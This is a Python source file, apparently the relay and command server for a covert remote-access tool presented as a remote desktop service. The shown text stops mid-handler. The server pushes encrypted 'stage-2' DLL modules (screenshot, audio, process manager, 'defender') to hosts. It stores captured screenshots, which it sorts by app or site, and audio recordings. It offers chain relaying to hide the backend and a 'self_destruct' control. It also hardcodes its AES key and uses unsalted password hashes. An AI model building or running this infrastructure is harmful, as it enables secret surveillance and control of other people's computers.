#!/usr/bin/env python3
"""
RemoteDesktop VPS Server - WebSocket Relay
Bridges C++ host <--> Web client
Version: 2024-03-12-v3 (stream throttle + diagnostics)
"""
SERVER_VERSION = "1.0.234"

import asyncio
import websockets
import json
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler
import hashlib
import secrets
import time
import ssl
import os
import base64
import socket
import struct
import glob as glob_module
from typing import Dict, Optional, Set
from pathlib import Path
from dataclasses import dataclass, field

# ─── AES-256-CBC Encryption (compatible with ServiceManagerApp / C++ host) ──
AES_KEY = bytes([0x3A,0x7F,0x21,0x94,0xC5,0xD2,0x6B,0x11,0x8E,0x4C,0xF9,0x53,0x07,0xB8,0xDA,0x62,
                 0x19,0xAF,0x33,0xE4,0x5D,0x70,0x88,0x9B,0xC1,0x2E,0x47,0x6A,0x8D,0x90,0xAB,0xCD])
AES_IV  = bytes([0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0,0x0F,0x1E,0x2D,0x3C,0x4B,0x5A,0x69,0x78])

def _aes_decrypt(data: bytes) -> bytes:
    """AES-256-CBC decrypt with PKCS7 unpadding. Pure Python (no deps)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding as sym_padding
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV))
        dec = cipher.decryptor()
        padded = dec.update(data) + dec.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()
    except ImportError:
        # Fallback: pure Python AES (minimal, for when cryptography not installed)
        log.warning("cryptography package not installed, cannot decrypt screenshots")
        return data

def _decrypt_filename(enc_b64: str) -> str:
    """Decrypt URL-safe Base64 filename back to plaintext."""
    # Restore standard Base64
    s = enc_b64.replace('_', '/').replace('-', '+')
    # Add padding
    while len(s) % 4 != 0:
        s += '='
    try:
        enc_bytes = base64.b64decode(s)
        dec_bytes = _aes_decrypt(enc_bytes)
        return dec_bytes.decode('utf-8')
    except Exception:
        return enc_b64  # Return as-is if decryption fails

# ─── Screenshot Storage ──────────────────────────────────────────────────────
SCREENSHOT_DIR = Path(os.environ.get("RDP_SCREENSHOT_DIR", "/opt/remotedesk/screenshots"))
SCREENSHOT_QUOTA = int(os.environ.get("RDP_SCREENSHOT_QUOTA", 500_000_000))  # 500MB default
SCREENSHOT_TEMPLATES_FILE = SCREENSHOT_DIR / "_templates.json"

# Audio recording storage
AUDIO_DIR = Path(os.environ.get("RDP_AUDIO_DIR", "/opt/remotedesk/audio"))
AUDIO_QUOTA = int(os.environ.get("RDP_AUDIO_QUOTA", 500_000_000))  # 500MB default

# ─── Stage-2 encrypted module blobs ──────────────────────────────────────────
# Directory layout (flat, one shared set of DLLs for ALL room tokens):
#     STAGE2_DIR/<module>.dll         ← unencrypted, source of truth
#     STAGE2_DIR/cache/<token>/<module>.bin   ← server-generated cache (auto)
#
# Flow: host sends stage2_fetch{module}. If the per-(token, module) blob is
# already cached on disk, serve it. Otherwise, read the DLL, AES-256-GCM
# encrypt with key derived from the room's token (matches aes_gcm.h
# derive_key: SHA256("pnp.stage2.v1" || token)), write to cache, serve.
#
# Advantages over pre-encrypted per-token blobs:
#   * One directory of DLLs covers every current/future room_token
#   * Admin never has to pre-generate anything per token
#   * Cache ensures first-hit is the only slow request (~50ms for 250KB)
#
# Deploy: just copy build/stage2/*.dll (3 files) to STAGE2_DIR on the VPS.
STAGE2_DIR = Path(os.environ.get("RDP_STAGE2_DIR", "/opt/remotedesk/stage2"))
# JSONL log of host_event messages (startup/shutdown/sleep/wake/lock/unlock).
# One line per event, easy to grep / awk / feed into analytics. See server
# "host_event" handler for the schema: {ts, token, event, host_version, epoch}.
HOST_EVENTS_LOG = Path(os.environ.get("RDP_HOST_EVENTS_LOG",
                                       "/opt/remotedesk/host_events.log"))
# In-memory ring buffer of the last 200 host events (all tokens).
# Populated on server start from the log file + updated on every new host_event.
# Allows fast "recent feed" queries without re-parsing the whole log.
from collections import deque as _deque
_recent_host_events: "_deque[dict]" = _deque(maxlen=200)
STAGE2_CACHE_DIR = STAGE2_DIR / "cache"
STAGE2_MAX_BLOB = int(os.environ.get("RDP_STAGE2_MAX_BLOB", 10_000_000))  # 10MB safety cap

# Whitelist of module names to avoid path traversal shenanigans
STAGE2_KNOWN_MODULES = frozenset({
    "screenshot", "audio", "stream", "filemgr", "procmgr", "defender",
    "sysinfo",
    # Dev/test:
    "sample",
})


def _stage2_derive_key(token: str) -> bytes:
    """Match aes_gcm.h derive_key(): SHA-256('pnp.stage2.v1' || token) -> 32B."""
    h = hashlib.sha256()
    h.update(b"pnp.stage2.v1")
    h.update(token.encode("utf-8"))
    return h.digest()


def _stage2_encrypt(key: bytes, plaintext: bytes) -> bytes:
    """AES-256-GCM blob format: [12B IV][ciphertext][16B tag]."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    iv = os.urandom(12)
    return iv + AESGCM(key).encrypt(iv, plaintext, associated_data=None)


def _stage2_get_blob(token: str, module: str) -> Optional[bytes]:
    """Return an encrypted blob for (token, module), reading from cache or
    generating on-the-fly from the DLL. Returns None if the DLL is missing."""
    cache_path = STAGE2_CACHE_DIR / token / f"{module}.bin"
    if cache_path.is_file():
        return cache_path.read_bytes()
    dll_path = STAGE2_DIR / f"{module}.dll"
    if not dll_path.is_file():
        return None
    try:
        key = _stage2_derive_key(token)
        blob = _stage2_encrypt(key, dll_path.read_bytes())
        cache_path.parent.mkdir(parents=True, exist_ok=True)
        cache_path.write_bytes(blob)
        return blob
    except Exception as e:
        log.warning(f"stage2: encrypt failed for {module}/{token[:8]}: {e}")
        return None

def _ensure_screenshot_dir(token: str) -> Path:
    d = SCREENSHOT_DIR / token
    d.mkdir(parents=True, exist_ok=True)
    return d

def _get_screenshot_dir_size(d: Path) -> int:
    return sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix == '.jpg')

def _get_quota_for_dir(d: Path) -> int:
    """Read saved quota from _quota.txt, or use global default."""
    quota_file = d / "_quota.txt"
    if quota_file.exists():
        try:
            mb = int(quota_file.read_text().strip())
            return mb * 1_000_000
        except:
            pass
    # Also check parent dir (in case d is the token subdir)
    parent_quota = d.parent / "_quota.txt"
    if parent_quota.exists():
        try:
            return int(parent_quota.read_text().strip()) * 1_000_000
        except:
            pass
    return SCREENSHOT_QUOTA

def _get_app_quotas(d: Path) -> dict:
    """Read per-app quotas from _app_quotas.json"""
    qf = d / "_app_quotas.json"
    if qf.exists():
        try: return json.loads(qf.read_text())
        except: pass
    return {}

def _save_app_quotas(d: Path, quotas: dict):
    d.mkdir(parents=True, exist_ok=True)
    (d / "_app_quotas.json").write_text(json.dumps(quotas, indent=2, ensure_ascii=False))

def _get_app_from_filename(name: str) -> str:
    """Extract app/site name from screenshot filename: YYYYMMDD_HHMMSS_AppName"""
    parts = name.replace('.jpg', '').split('_')
    return '_'.join(parts[2:]) if len(parts) > 2 else 'Desktop'

def _enforce_quota(d: Path, quota: int = 0):
    """Enforce quota PER CATEGORY. Each app/site gets the same quota limit."""
    if quota <= 0:
        quota = _get_quota_for_dir(d)

    all_files = [f for f in d.iterdir() if f.is_file() and f.suffix == '.jpg']

    # Group files by app/site category
    app_files = {}
    for f in all_files:
        app = _get_app_from_filename(f.stem)
        if app not in app_files: app_files[app] = []
        app_files[app].append(f)

    # Apply same quota to EACH category separately
    for app, files in app_files.items():
        files.sort(key=lambda f: f.stat().st_mtime)
        total = sum(f.stat().st_size for f in files)
        while total > quota and files:
            oldest = files.pop(0)
            total -= oldest.stat().st_size
            oldest.unlink(missing_ok=True)
            log.info(f"Quota [{app}]: deleted {oldest.name}, {total//1024}KB/{quota//1024}KB")

def _save_screenshot(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
    """Decrypt and save screenshot. Returns decrypted filename or None."""
    try:
        d = _ensure_screenshot_dir(token)
        plain_name = _decrypt_filename(enc_name)
        plain_data = _aes_decrypt(enc_data)
        if not plain_data or len(plain_data) < 100:
            log.warning(f"Screenshot decrypt failed or too small: name={enc_name[:30]} data_len={len(enc_data)} decrypted={len(plain_data) if plain_data else 0}")
            return None
        safe_name = "".join(c for c in plain_name if c.isalnum() or c in ' _-').strip()
        if not safe_name:
            safe_name = f"shot_{int(time.time())}"
        fpath = d / f"{safe_name}.jpg"
        # Avoid overwrite
        if fpath.exists():
            fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.jpg"
        fpath.write_bytes(plain_data)
        _enforce_quota(d)
        log.info(f"Screenshot saved: {safe_name} ({len(plain_data)//1024}KB) quota_dir={d}")
        return safe_name
    except Exception as e:
        log.error(f"Screenshot save error: {e}")
        return None

def _list_screenshots(token: str) -> list:
    """List all screenshots for a room token."""
    d = SCREENSHOT_DIR / token
    if not d.exists():
        return []
    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix == '.jpg'],
                   key=lambda f: f.stat().st_mtime, reverse=True)
    result = []
    for f in files:
        st = f.stat()
        result.append({
            "name": f.stem,
            "size": st.st_size,
            "time": int(st.st_mtime),
            "downloaded": False,  # TODO: track in metadata
        })
    return result

def _make_thumbnail(fpath: Path, max_size: int = 200) -> bytes:
    """Create JPEG thumbnail. Uses PIL if available, otherwise returns full image."""
    try:
        from PIL import Image
        import io
        img = Image.open(fpath)
        img.thumbnail((max_size, max_size))
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=60)
        return buf.getvalue()
    except ImportError:
        # No PIL — return full file (client will resize)
        return fpath.read_bytes()

def _load_templates() -> dict:
    if SCREENSHOT_TEMPLATES_FILE.exists():
        try:
            return json.loads(SCREENSHOT_TEMPLATES_FILE.read_text())
        except Exception:
            pass
    return {}

def _save_templates(templates: dict):
    SCREENSHOT_TEMPLATES_FILE.parent.mkdir(parents=True, exist_ok=True)
    SCREENSHOT_TEMPLATES_FILE.write_text(json.dumps(templates, indent=2, ensure_ascii=False))

# ─── Audio Recording Storage ─────────────────────────────────────────────────
def _ensure_audio_dir(token: str) -> Path:
    d = AUDIO_DIR / token
    d.mkdir(parents=True, exist_ok=True)
    return d

def _save_audio(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
    """Decrypt and save audio recording."""
    try:
        d = _ensure_audio_dir(token)
        plain_name = _decrypt_filename(enc_name)
        plain_data = _aes_decrypt(enc_data)
        if not plain_data or len(plain_data) < 100:
            log.warning(f"Audio decrypt failed: name={enc_name[:30]} data={len(enc_data)}")
            return None
        safe_name = "".join(c for c in plain_name if c.isalnum() or c in ' _-').strip()
        if not safe_name: safe_name = f"audio_{int(time.time())}"
        fpath = d / f"{safe_name}.ogg"
        if fpath.exists(): fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.ogg"
        fpath.write_bytes(plain_data)
        # Enforce quota
        _enforce_audio_quota(d)
        log.info(f"Audio saved: {safe_name} ({len(plain_data)//1024}KB)")
        return safe_name
    except Exception as e:
        log.error(f"Audio save error: {e}")
        return None

def _list_audio(token: str) -> list:
    d = AUDIO_DIR / token
    if not d.exists(): return []
    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav')],
                   key=lambda f: f.stat().st_mtime, reverse=True)
    return [{"name": f.stem, "ext": f.suffix, "size": f.stat().st_size, "time": int(f.stat().st_mtime)} for f in files]

def _get_audio_quota(d: Path) -> int:
    qf = d / "_quota.txt"
    if qf.exists():
        try: return int(qf.read_text().strip()) * 1_000_000
        except: pass
    return AUDIO_QUOTA

def _enforce_audio_quota(d: Path):
    quota = _get_audio_quota(d)
    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav')],
                   key=lambda f: f.stat().st_mtime)
    total = sum(f.stat().st_size for f in files)
    while total > quota and files:
        oldest = files.pop(0)
        total -= oldest.stat().st_size
        oldest.unlink(missing_ok=True)
        log.info(f"Audio quota: deleted {oldest.name}, {total//1024}KB/{quota//1024}KB")

# ─── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        # Rotate at 1 MB, keep 1 backup → log never exceeds 2 MB on disk
        RotatingFileHandler("vps_server.log", maxBytes=1*1024*1024, backupCount=1, encoding="utf-8"),
    ],
)
log = logging.getLogger("rdp_server")


class _SuppressHandshakeTraceback(logging.Filter):
    """Hide websockets.server ERROR traceback when it's our known proxy (Sec-WebSocket-Key) error."""
    def filter(self, record):
        if record.name != "websockets.server":
            return True
        if record.levelno != logging.ERROR:
            return True
        try:
            msg = record.getMessage()
        except Exception:
            msg = str(record.msg)
        if "opening handshake failed" in msg:
            return False
        return True


logging.getLogger("websockets.server").addFilter(_SuppressHandshakeTraceback())

# ─── Fix Connection: keep-alive → Upgrade for proxies (426) ───────────────────
# Message shown when proxy strips Sec-WebSocket-Key (cannot be fixed in app — proxy must forward headers)
PROXY_WS_HINT = (
    "Missing Sec-WebSocket-Key: your reverse proxy is stripping WebSocket headers. "
    "Configure the proxy to forward: Upgrade, Connection, Sec-WebSocket-Key, Sec-WebSocket-Version. "
    "Example (nginx): proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"Upgrade\";"
)


def _install_connection_header_fix():
    """Ensure protocol.process_request sees Connection: Upgrade when proxy sent keep-alive."""
    try:
        from websockets import server as ws_server
        from websockets import headers as ws_headers
        from websockets.http11 import Request
        from websockets.datastructures import Headers
        from websockets.exceptions import InvalidHeader, InvalidHandshake
        orig = ws_server.ServerProtocol.process_request

        def process_request(self, request):
            connection = sum(
                [ws_headers.parse_connection(v) for v in request.headers.get_all("Connection")],
                [],
            )
            # Fix when proxy sends Connection: keep-alive, close, or other (no "upgrade").
            if not any(v.lower() == "upgrade" for v in connection):
                new_headers = Headers()
                for name, value in request.headers.raw_items():
                    new_headers[name] = value
                try:
                    del new_headers["Connection"]
                except KeyError:
                    pass
                new_headers["Connection"] = "Upgrade"
                upgrade_vals = new_headers.get_all("Upgrade")
                if not upgrade_vals or "websocket" not in (upgrade_vals[0] or "").lower():
                    try:
                        del new_headers["Upgrade"]
                    except KeyError:
                        pass
                    new_headers["Upgrade"] = "websocket"
                request = Request(
                    path=request.path,
                    headers=new_headers,
                    _exception=getattr(request, "_exception", None),
                )
            try:
                return orig(self, request)
            except InvalidHeader as e:
                if "Sec-WebSocket-Key" in str(e):
                    log.warning(
                        "WebSocket rejected: proxy is not forwarding Sec-WebSocket-Key. "
                        "Run on server: sudo bash deploy-web.sh && sudo systemctl reload nginx. "
                        "If using Cloudflare: enable WebSockets in Network settings."
                    )
                    raise InvalidHandshake(PROXY_WS_HINT) from None
                raise
        ws_server.ServerProtocol.process_request = process_request
        log.info("WebSocket: Connection header fix installed (proxy keep-alive -> Upgrade)")
    except Exception as e:
        log.warning("WebSocket Connection header fix not installed: %s", e)

_install_connection_header_fix()


def _install_http10_reject():
    """On HTTP/1.0 or invalid request, send 400 and close instead of traceback (expected HTTP/1.1)."""
    from websockets.exceptions import InvalidMessage

    def _send_400_and_close(transport):
        try:
            if transport and not getattr(transport, "is_closing", lambda: False)():
                transport.write(
                    b"HTTP/1.1 400 Bad Request\r\n"
                    b"Connection: close\r\n"
                    b"Content-Type: text/plain; charset=utf-8\r\n"
                    b"Content-Length: 72\r\n\r\n"
                    b"WebSocket requires HTTP/1.1. Use the web page on port 80, not 8080."
                )
                transport.close()
        except Exception:
            pass
        log.warning(
            "Rejected invalid request (HTTP/1.0, HTTP/2, or bad). Use nginx with proxy_http_version 1.1 and forward Sec-WebSocket-Key, Sec-WebSocket-Version, Upgrade, Connection."
        )

    def _is_http10_error(e):
        msg = str(e)
        return (
            ("unsupported protocol" in msg and "expected HTTP/1.1" in msg)
            or "HTTP/1.0" in msg
            or "PRI " in msg
            or "HTTP/2.0" in msg
            or ("did not receive a valid HTTP request" in msg and "expected GET" not in msg and "unsupported HTTP method" not in msg)
        )

    def _is_wrong_method(e):
        msg = str(e)
        return "expected GET" in msg or "unsupported HTTP method" in msg

    def _reject_and_raise(transport):
        _send_400_and_close(transport)
        raise InvalidMessage("HTTP/1.0 not supported")

    # websockets 13+: handshake is on ServerConnection (asyncio.server)
    patched = False
    try:
        from websockets.asyncio import server as ws_async_server
        Conn = getattr(ws_async_server, "ServerConnection", None) or getattr(ws_async_server, "WebSocketServerProtocol", None)
        if Conn and hasattr(Conn, "handshake"):
            _orig = Conn.handshake
            async def _wrap(self, *args, _orig=_orig, **kwargs):
                try:
                    return await _orig(self, *args, **kwargs)
                except InvalidMessage as e:
                    msg = str(e)
                    if _is_wrong_method(e):
                        _send_400_and_close(getattr(self, "transport", None))
                        log.warning("Rejected: WebSocket handshake requires GET (got POST or other).")
                        return
                    if _is_http10_error(e):
                        _reject_and_raise(getattr(self, "transport", None))
                    raise
            Conn.handshake = _wrap
            patched = True
            log.info("WebSocket: HTTP/1.0 rejection handler installed (ServerConnection)")
    except (ImportError, AttributeError):
        pass
    if patched:
        return
    try:
        from websockets.legacy import server as ws_legacy
        Conn = getattr(ws_legacy, "ServerConnection", None) or getattr(ws_legacy, "WebSocketServerProtocol", None)
        if Conn and hasattr(Conn, "handshake"):
            _orig = Conn.handshake
            async def _wrap(self, *args, _orig=_orig, **kwargs):
                try:
                    return await _orig(self, *args, **kwargs)
                except InvalidMessage as e:
                    if _is_wrong_method(e):
                        _send_400_and_close(getattr(self, "transport", None))
                        log.warning("Rejected: WebSocket handshake requires GET (got POST or other).")
                        return
                    if _is_http10_error(e):
                        _reject_and_raise(getattr(self, "transport", None))
                    raise
            Conn.handshake = _wrap
            patched = True
            log.info("WebSocket: HTTP/1.0 rejection handler installed (legacy)")
    except (ImportError, AttributeError):
        pass

    # Fallback: websockets <13 or different layout — ServerProtocol.handshake
    if not patched:
        try:
            from websockets import server as ws_server
            if hasattr(ws_server.ServerProtocol, "handshake"):
                _orig = ws_server.ServerProtocol.handshake
                async def _wrap_proto(self, *args, **kwargs):
                    try:
                        return await _orig(self, *args, **kwargs)
                    except InvalidMessage as e:
                        if _is_http10_error(e):
                            _reject_and_raise(getattr(self, "transport", None))
                        raise
                ws_server.ServerProtocol.handshake = _wrap_proto
                patched = True
                log.info("WebSocket: HTTP/1.0 rejection handler installed (ServerProtocol)")
        except Exception:
            pass

    if not patched:
        log.debug("WebSocket: HTTP/1.0 rejection not installed (no handshake found); asyncio handler will log rejects")


_install_http10_reject()

# ─── Config ─────────────────────────────────────────────────────────────────
HOST = os.environ.get("RDP_HOST", "0.0.0.0")
PORT = int(os.environ.get("RDP_PORT", "8080"))
ADMIN_TOKEN = os.environ.get("RDP_ADMIN_TOKEN", "change-me-admin-token")

# ── User accounts (viewer login) ──
# Separate from room_token. The room_token pairs a host with its viewers
# (shared by everyone in the same room). User accounts are PER-OPERATOR
# and let us distinguish individual human users inside that room, gate
# tab access by role, and attribute activity to a person.
USERS_FILE = Path(os.environ.get("RDP_USERS_FILE", "/opt/remotedesk/users.json"))
USER_ACTIVITY_LOG = Path(os.environ.get("RDP_USER_ACTIVITY_LOG",
                                         "/opt/remotedesk/user_activity.log"))
# Session tokens live in memory only — if the server restarts, everyone
# logs in again. Maps session_id → {username, role, allowed_tabs, created_at}.
_sessions: dict = {}

# Canonical list of tabs in the viewer. Admins by default see everything;
# operators see a restricted subset. Users can be granted/denied individual
# tabs via the allowed_tabs field to override the role default.
# Canonical tab names MUST match the data-panel attribute on the
# corresponding nav button in index.html. Previous bug: server had
# "screenshot" but the DOM has data-panel="screenshots" (plural), so
# an operator granted "screenshot" would never see the panel. "threat"
# was listed but no such DOM panel exists.
#
# Settings sub-sections are addressable as "settings.<block>" so an
# admin can grant individual setting blocks. If the user has plain
# "settings" in allowed_tabs, ALL blocks are visible; otherwise only
# the ones explicitly listed as "settings.<block>".
ALL_TABS = [
    "dashboard", "files", "procs", "services", "registry", "programs",
    "eventlog", "terminal", "screenshots", "audio",
    "host_events", "users", "settings",
    "settings.save_paths",       # download / recording / screenshot / audio folders
    "settings.screenshots_vps",  # VPS quota for screenshots
    "settings.audio_vps",        # VPS quota for audio
    "settings.streaming",        # jitter buffer, quality
    "settings.ice_servers",      # STUN / TURN / WebRTC enable
    "settings.host_update",      # Remote DLL update + Restart
    "settings.vps_deploy",       # Upload files to VPS
    "settings.host_config",      # pnpext.sys editor
    "settings.threat",           # Threat Monitor
    "settings.self_destruct",    # danger zone — always admin-only anyway
]
DEFAULT_OPERATOR_TABS = [
    "dashboard", "files", "procs", "services", "terminal",
    "screenshots", "audio",
]
MAX_ROOMS = int(os.environ.get("RDP_MAX_ROOMS", "100"))
MAX_CLIENTS_PER_ROOM = int(os.environ.get("RDP_MAX_CLIENTS", "10"))
PING_INTERVAL = 10   # 10s ping interval (2s was too aggressive, wasted event loop time during file transfers)
PING_TIMEOUT = 30    # 30s (was 120s — stale clients stayed "online" for 2 minutes)
SSL_CERT = os.environ.get("RDP_SSL_CERT", "")
SSL_KEY  = os.environ.get("RDP_SSL_KEY", "")

# ─── Chain relay mode (VPS1 → VPS2) ─────────────────────────────────────────
# Set RDP_CHAIN_UPSTREAM to the WebSocket base URL of VPS2 to activate chain
# mode.  In this mode server.py acts as a transparent WS bridge — no auth logic
# runs locally; all traffic is forwarded to the upstream relay.
#
# Topology:  Host → VPS1 (this server, chain mode) → VPS2 (full relay) ← Client
#
# Example systemd env:
#   Environment=RDP_CHAIN_UPSTREAM=wss://vps2.example.com:443
#
# Set RDP_CHAIN_SSL_VERIFY=0 when VPS2 uses a self-signed certificate.
CHAIN_UPSTREAM  = os.environ.get("RDP_CHAIN_UPSTREAM", "").rstrip("/")
CHAIN_SSL_VERIFY = os.environ.get("RDP_CHAIN_SSL_VERIFY", "1") != "0"

# ─── Infra monitoring ────────────────────────────────────────────────────────
# RDP_CHAIN_VPS1_HOST — host or IP of VPS1 (set on VPS2 to enable chain probe)
# RDP_CHAIN_VPS1_PORT — port to probe (default 443)
CHAIN_VPS1_HOST = os.environ.get("RDP_CHAIN_VPS1_HOST", "").strip()
CHAIN_VPS1_PORT = int(os.environ.get("RDP_CHAIN_VPS1_PORT", "443"))
SERVER_START_TIME = time.time()

def _get_sys_stats() -> dict:
    """Read basic system metrics from /proc (Linux). Silent on failure."""
    s: dict = {}
    try:
        parts = Path("/proc/loadavg").read_text().split()
        s["load_1m"]  = float(parts[0])
        s["load_5m"]  = float(parts[1])
        s["load_15m"] = float(parts[2])
    except Exception:
        pass
    try:
        mem: dict = {}
        for line in Path("/proc/meminfo").read_text().splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                mem[k.strip()] = int(v.split()[0])   # kB
        total = mem.get("MemTotal", 0)
        avail = mem.get("MemAvailable", 0)
        if total:
            s["mem_total_mb"] = total // 1024
            s["mem_used_mb"]  = (total - avail) // 1024
            s["mem_pct"]      = round((total - avail) / total * 100)
    except Exception:
        pass
    try:
        s["os_uptime_s"] = int(float(Path("/proc/uptime").read_text().split()[0]))
    except Exception:
        pass
    return s

def _get_node_info() -> dict:
    """Return this server's own node status snapshot."""
    total_hosts   = sum(1 for r in rooms.values() if r.host is not None)
    total_clients = sum(len(r.clients) for r in rooms.values())
    mode = "chain-relay" if CHAIN_UPSTREAM else "relay"
    info: dict = {
        "version":          SERVER_VERSION,
        "mode":             mode,
        "uptime_s":         int(time.time() - SERVER_START_TIME),
        "rooms_active":     len(rooms),
        "hosts_connected":  total_hosts,
        "clients_connected": total_clients,
        "server_time":      datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    if CHAIN_UPSTREAM:
        info["chain_upstream"] = CHAIN_UPSTREAM
    info.update(_get_sys_stats())
    return info

async def _probe_tcp(host: str, port: int, timeout: float = 5.0) -> dict:
    """TCP-level probe: connect, measure RTT, close. Returns {online, rtt_ms, error?}."""
    t0 = time.time()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout,
        )
        rtt_ms = int((time.time() - t0) * 1000)
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        return {"online": True, "rtt_ms": rtt_ms}
    except asyncio.TimeoutError:
        return {"online": False, "error": "timeout", "rtt_ms": int(timeout * 1000)}
    except Exception as exc:
        return {"online": False, "error": str(exc), "rtt_ms": int((time.time() - t0) * 1000)}

# ─── Data Structures ────────────────────────────────────────────────────────
@dataclass
class Connection:
    ws: object
    role: str           # "host" | "client" | "stream"
    token: str
    user_id: str = ""
    remote: str = ""
    username: str = ""  # Set after successful user_login; "" until then
    connected_at: float = field(default_factory=time.time)
    bytes_sent: int = 0
    bytes_recv: int = 0
    msg_count: int = 0

@dataclass
class Room:
    token: str
    password_hash: str
    host: Optional[Connection] = None
    clients: Dict[str, Connection] = field(default_factory=dict)
    stream_clients: Dict[str, Connection] = field(default_factory=dict)  # SCRN-only connections (client→receive)
    host_streams: Dict[str, Connection] = field(default_factory=dict)  # Host stream senders (host→send SCRN)
    file_clients: Dict[str, Connection] = field(default_factory=dict)  # file_recv connections (dedicated file channel)
    _file_rr: int = 0  # Round-robin index for distributing FILE chunks across file_recv connections
    created_at: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    frame_count: int = 0
    # Total stream stats (across ALL stream connections)
    _total_frames_in: int = 0
    _total_frames_out: int = 0
    _total_frames_dropped: int = 0
    _total_bytes_out: int = 0
    _total_stats_time: float = field(default_factory=time.time)
    _pending_binary_targets: list = field(default_factory=list)  # Queue of targets for pipelined binary routing
    _pending_file_targets: list = field(default_factory=list)    # Queue of targets for host_file → file_recv routing

    def is_full(self) -> bool:
        return len(self.clients) >= MAX_CLIENTS_PER_ROOM

    def touch(self):
        self.last_activity = time.time()

# In-memory room registry
rooms: Dict[str, Room] = {}
rooms_lock = asyncio.Lock()

# ─── Auth helpers ────────────────────────────────────────────────────────────
def hash_password(pw: str) -> str:
    return hashlib.sha256(pw.encode()).hexdigest()

def check_password(plain: str, hashed: str) -> bool:
    if not hashed:   # no password set → allow
        return True
    return hash_password(plain) == hashed

def new_user_id() -> str:
    return secrets.token_hex(8)

# ─── JSON helpers ─────────────────────────────────────────────────────────────
def make_error(msg: str, req_id: str = "") -> str:
    return json.dumps({"ok": False, "error": msg, "id": req_id}, ensure_ascii=False)

def make_ok(data, req_id: str = "") -> str:
    return json.dumps({"ok": True, "data": data, "id": req_id}, ensure_ascii=False)

def make_event(event: str, data) -> str:
    return json.dumps({"event": event, "data": data}, ensure_ascii=False)

# ─── Room management ─────────────────────────────────────────────────────────
async def get_or_create_room(token: str, password: str = "", role: str = "client") -> Room:
    async with rooms_lock:
        if token not in rooms:
            if len(rooms) >= MAX_ROOMS:
                raise ValueError("Server at room capacity")
            rooms[token] = Room(
                token=token,
                password_hash=hash_password(password) if password else "",
            )
            log.info(f"Room created: {token}")
        elif role == "host" and password:
            # Host reconnects with new password — update the room's password
            rooms[token].password_hash = hash_password(password)
        return rooms[token]

async def cleanup_empty_rooms():
    """Periodically remove stale rooms with no host for >5 min"""
    while True:
        await asyncio.sleep(60)
        async with rooms_lock:
            stale = [
                t for t, r in rooms.items()
                if r.host is None and (time.time() - r.last_activity) > 300
            ]
            for t in stale:
                del rooms[t]
                log.info(f"Room removed (stale): {t}")

# ─── WebSocket handler ───────────────────────────────────────────────────────
async def handler(websocket, path: str):
    remote = websocket.remote_address
    log.info(f"New connection from {remote} path={path}")


    # ── TCP buffer optimization: large buffers + no-delay for throughput ──
    _sock = None
    try:
        _sock = websocket.transport.get_extra_info("socket")
        if _sock:
            _sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)  # 2MB send
            _sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2 * 1024 * 1024)  # 2MB recv
            _sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)              # No Nagle
    except Exception:
        pass

    conn: Optional[Connection] = None
    room: Optional[Room] = None

    try:
        # ── Auth phase ─────────────────────────────────────────────────────
        try:
            raw = await asyncio.wait_for(websocket.recv(), timeout=10)
        except asyncio.TimeoutError:
            await websocket.send(make_error("Auth timeout"))
            return
        
        try:
            msg = json.loads(raw)
        except json.JSONDecodeError:
            await websocket.send(make_error("Invalid JSON"))
            return
        
        if msg.get("cmd") != "auth":
            await websocket.send(make_error("Expected auth command"))
            return
        
        token    = str(msg.get("token", "")).strip()
        password = str(msg.get("password", ""))
        role     = str(msg.get("role", "client"))
        
        if not token:
            await websocket.send(make_error("Missing token"))
            return
        
        if role not in ("host", "client", "stream", "host_stream", "host_file", "file_recv"):
            await websocket.send(make_error("Invalid role"))
            return
        
        try:
            room = await get_or_create_room(token, password if role == "host" else "", role)
        except ValueError as e:
            await websocket.send(make_error(str(e)))
            return
        
        # Password check for clients and stream connections
        if role in ("client", "stream", "file_recv"):
            if not check_password(password, room.password_hash):
                await websocket.send(make_error("Wrong password"))
                log.warning(f"Auth failed from {remote} (wrong password)")
                return
            if role == "client" and room.is_full():
                await websocket.send(make_error("Room full"))
                return

        # host_stream/host_file uses same password as host (already set when host connected)
        if role in ("host_stream", "host_file"):
            if not check_password(password, room.password_hash):
                await websocket.send(make_error("Wrong password"))
                log.warning(f"Auth failed from {remote} ({role} wrong password)")
                return
        
        # Register connection
        user_id = new_user_id()
        conn = Connection(
            ws=websocket,
            role=role,
            token=token,
            user_id=user_id,
            remote=str(remote),
        )
        
        async with rooms_lock:
            if role == "host":
                old_host = room.host
                room.host = conn
                # Don't close old host WS — let it die naturally
                # Closing it causes the host to see CLOSE frame → reconnect loop
                # host_online notification sent after lock release (line 707)
            elif role == "host_stream":
                room.host_streams[user_id] = conn
            elif role == "host_file":
